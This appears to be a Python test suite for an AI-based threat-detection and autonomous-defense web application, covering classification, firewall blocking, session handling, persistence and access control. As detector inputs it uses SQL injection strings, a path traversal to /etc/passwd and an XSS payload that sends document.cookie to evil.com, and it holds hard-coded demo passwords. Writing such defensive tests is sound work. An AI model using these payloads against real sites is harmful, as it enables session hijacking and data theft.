"""
Verification and test suite.
1. AI model: feature extraction and classification of every attack vector
2. Autonomous defense: firewall block, session termination, SIEM alert
3. Pipeline, simulator and SQLite persistence
4. Authentication, role-based access control and audit trail
5. REST API responses
"""

import os
import tempfile
import unittest

# Use a throw-away database so tests never touch the real one
_tmp = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
_tmp.close()
os.environ["CYBERDEFENSE_DB"] = _tmp.name

from engine.ai_model import ThreatDetectionEngine          # noqa: E402
from engine.telemetry import TelemetryManager              # noqa: E402
from engine.defense_orchestrator import DefenseOrchestrator  # noqa: E402
from engine.simulator import AttackSimulator               # noqa: E402
from engine.database import Database                       # noqa: E402
from engine.pipeline import SecurityPipeline               # noqa: E402
from app import app, db as app_db                          # noqa: E402

AI = ThreatDetectionEngine()  # trained once and shared by all tests


class TestEngine(unittest.TestCase):
    def setUp(self):
        self.ai = AI
        self.telemetry = TelemetryManager(max_events=100)
        self.defense = DefenseOrchestrator(self.telemetry)

    def test_feature_extraction(self):
        event = {"payload": "' UNION SELECT password FROM users WHERE 1=1; --",
                 "endpoint": "/api/v1/search", "method": "POST"}
        feats = self.ai.extract_features(event)
        self.assertGreater(feats["entropy"], 3.0)
        self.assertGreater(feats["sqli_hits"], 0)
        self.assertGreater(feats["special_ratio"], 0.05)

    def test_sqli_classification(self):
        res = self.ai.analyze_event({"ip": "194.26.29.112", "endpoint": "/api/v1/user/search",
                                     "method": "POST", "payload": "' OR 1=1 --"})
        self.assertEqual(res["predicted_class"], "SQL_INJECTION")
        self.assertGreaterEqual(res["risk_score"], 70)
        self.assertEqual(res["mitre"]["id"], "T1190")

    def test_benign_classification(self):
        res = self.ai.analyze_event({"ip": "192.168.1.15", "endpoint": "/api/v1/products",
                                     "method": "GET", "payload": "category=laptops&sort=asc"})
        self.assertEqual(res["predicted_class"], "BENIGN")
        self.assertEqual(res["risk_level"], "LOW")

    def test_benign_json_body_is_not_an_attack(self):
        res = self.ai.analyze_event({"ip": "192.168.1.20", "endpoint": "/api/v1/user/settings",
                                     "method": "POST",
                                     "payload": '{"theme": "dark", "notifications": true}'})
        self.assertEqual(res["predicted_class"], "BENIGN")

    def test_confidence_is_a_valid_percentage(self):
        for payload in ("' OR '1'='1' --", "<script>alert(1)</script>", "../../etc/passwd", "category=laptops"):
            res = self.ai.analyze_event({"ip": "10.0.0.9", "endpoint": "/q", "method": "POST", "payload": payload})
            self.assertTrue(0 <= res["confidence"] <= 100, res["confidence"])

    def test_ordinary_words_are_not_sql_injection(self):
        res = self.ai.analyze_event({"ip": "10.0.0.8", "endpoint": "/api/v1/products", "method": "GET",
                                     "payload": "please select a plan and update item #3"})
        self.assertEqual(res["features"]["sqli_hits"], 0)
        self.assertEqual(res["predicted_class"], "BENIGN")

    def test_autonomous_firewall_and_session(self):
        event = {"ip": "185.220.101.5", "endpoint": "/api/v1/user/profile", "method": "POST",
                 "payload": "<script>fetch('http://evil.com?c='+document.cookie)</script>",
                 "user": "compromised_user", "session_id": "sess_demo_analyst"}
        resp = self.defense.evaluate_and_respond(event, self.ai.analyze_event(event))
        self.assertTrue(self.defense.is_ip_blocked("185.220.101.5"))
        sessions = {s["session_id"]: s for s in self.telemetry.get_sessions()}
        self.assertEqual(sessions["sess_demo_analyst"]["status"], "TERMINATED")
        actions = [a["action"] for a in resp["actions"]]
        for expected in ("BLOCK_IP", "TERMINATE_SESSION", "SECURITY_ALERT"):
            self.assertIn(expected, actions)

    def test_advisory_mode_does_not_block(self):
        self.defense.set_mode("ADVISORY")
        event = {"ip": "45.154.255.88", "endpoint": "/x", "method": "POST", "payload": "' OR 1=1 --"}
        self.defense.evaluate_and_respond(event, self.ai.analyze_event(event))
        self.assertFalse(self.defense.is_ip_blocked("45.154.255.88"))

    def test_ddos_flood_detected_and_dropped(self):
        pipe = SecurityPipeline(self.ai, self.telemetry, self.defense)
        sim = AttackSimulator(ingestion_pipeline=pipe.process)
        events = sim.run_scenario("ddos_flood")
        classes = [e["classification"] for e in events]
        self.assertIn("DDOS_FLOOD", classes)
        self.assertEqual(classes[-1], "DROPPED_HOST")
        self.assertTrue(self.defense.is_ip_blocked("203.0.113.88"))


class TestDatabase(unittest.TestCase):
    def setUp(self):
        f = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        f.close()
        self.path = f.name
        self.db = Database(self.path)

    def tearDown(self):
        os.unlink(self.path)

    def test_password_is_hashed_and_verified(self):
        self.assertTrue(self.db.create_user("bob", "Secret@1", "USER"))
        self.assertIsNotNone(self.db.verify_user("bob", "Secret@1"))
        self.assertIsNone(self.db.verify_user("bob", "wrong"))
        with self.db._conn() as c:
            stored = c.execute("SELECT password_hash FROM users WHERE username='bob'").fetchone()[0]
        self.assertNotIn("Secret@1", stored)

    def test_events_and_firewall_persist(self):
        telemetry = TelemetryManager(max_events=50)
        defense = DefenseOrchestrator(telemetry, db=self.db)
        pipe = SecurityPipeline(AI, telemetry, defense, db=self.db)
        pipe.process({"ip": "194.26.29.112", "endpoint": "/q", "method": "POST", "payload": "' OR 1=1 --"})
        self.assertEqual(self.db.event_summary()["total_events"], 1)
        self.assertTrue(any(a["action"] == "BLOCK_IP" for a in self.db.get_audit()))
        # a new orchestrator (simulating a restart) restores the firewall rule
        restored = DefenseOrchestrator(TelemetryManager(), db=self.db)
        self.assertTrue(restored.is_ip_blocked("194.26.29.112"))


class TestWebApp(unittest.TestCase):
    def setUp(self):
        self.client = app.test_client()

    def login(self, user, pwd):
        return self.client.post("/login", data={"username": user, "password": pwd})

    def test_dashboard_requires_login(self):
        res = self.client.get("/")
        self.assertEqual(res.status_code, 302)
        self.assertIn("/login", res.headers["Location"])
        self.assertEqual(self.client.get("/api/metrics").status_code, 401)

    def test_invalid_login_rejected_and_audited(self):
        res = self.login("admin", "bad-password")
        self.assertEqual(res.status_code, 401)
        self.assertTrue(any(a["action"] == "LOGIN_FAILED" for a in app_db.get_audit()))

    def test_admin_can_use_api(self):
        self.assertEqual(self.login("admin", "Admin@123").status_code, 302)
        res = self.client.get("/api/metrics")
        self.assertEqual(res.status_code, 200)
        for key in ("total_ingested", "threats_neutralized", "defcon"):
            self.assertIn(key, res.get_json())
        res = self.client.post("/api/simulate/scenario", json={"scenario": "brute_force", "count": 2})
        self.assertGreater(res.get_json()["executed_count"], 0)
        self.assertEqual(self.client.get("/api/report").status_code, 200)
        self.assertEqual(self.client.get("/api/users").status_code, 200)

    def test_standard_user_cannot_use_admin_controls(self):
        self.login("analyst", "Analyst@123")
        self.assertEqual(self.client.get("/api/metrics").status_code, 200)
        for path, body in (("/api/defense/mode", {"mode": "ADVISORY"}),
                           ("/api/firewall/block", {"ip": "10.9.9.9"}),
                           ("/api/system/reset", {})):
            self.assertEqual(self.client.post(path, json=body).status_code, 403, path)
        self.assertEqual(self.client.get("/api/users").status_code, 403)

    def test_logout_revokes_session(self):
        self.login("analyst", "Analyst@123")
        self.client.get("/logout")
        self.assertEqual(self.client.get("/api/metrics").status_code, 401)

    def test_terminated_session_is_logged_out(self):
        self.login("analyst", "Analyst@123")
        sid = self.client.get("/api/me").get_json()["session_id"]
        from app import telemetry_mgr
        telemetry_mgr.terminate_session(sid, reason="test")
        self.assertEqual(self.client.get("/api/metrics").status_code, 401)


if __name__ == "__main__":
    unittest.main(verbosity=2)
